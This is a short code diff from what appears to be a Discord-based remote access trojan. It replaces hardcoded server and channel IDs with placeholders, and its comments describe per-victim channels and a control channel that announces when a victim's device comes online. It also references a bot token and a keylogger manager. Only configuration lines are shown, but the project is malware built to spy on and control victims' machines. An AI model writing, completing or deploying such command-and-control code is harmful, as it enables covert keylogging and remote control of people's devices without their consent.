@@ -6,9 +6,9 @@ import os, sys, signal, subprocess
 from initiator import BOT_TOKEN, device_id
 from distortion import *
 
-GUILD_ID = 1380772426148745338
-ALL_VICTIMS_HERE = 1380802223977791578
-CONTROL_CENTER = 1381507376678572144
+GUILD_ID = "YOUR_DISCORD_SERVER_ID"
+ALL_VICTIMS_HERE = "CATEGORY_ID" # category id under dedicated channels for victim\s device is supposed to be created
+CONTROL_CENTER = "MAIN_CHANNEL_ID" # This channel will be used by the initiator when a victim comes online
 victim_channel = None
 keylogger_manager = None
 
